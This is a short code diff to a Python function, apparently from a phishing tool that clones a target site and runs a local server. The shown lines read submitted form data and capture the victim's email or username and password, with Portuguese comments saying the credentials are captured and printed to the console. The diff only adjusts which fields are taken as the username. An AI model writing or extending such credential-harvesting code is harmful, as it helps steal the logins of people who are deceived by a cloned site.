@@ -374,7 +374,7 @@ def run_local_server(clone_dir, target_url, language):
                 print("Received data:", data)
 
                 # Captura das credenciais
-                username = data.get('email', data.get('username', data.get('login')))
+                username = data.get('email', data.get('username',''))
                 password = data.get('pass', data.get('password', ''))
 
                 # Exibir credenciais no console
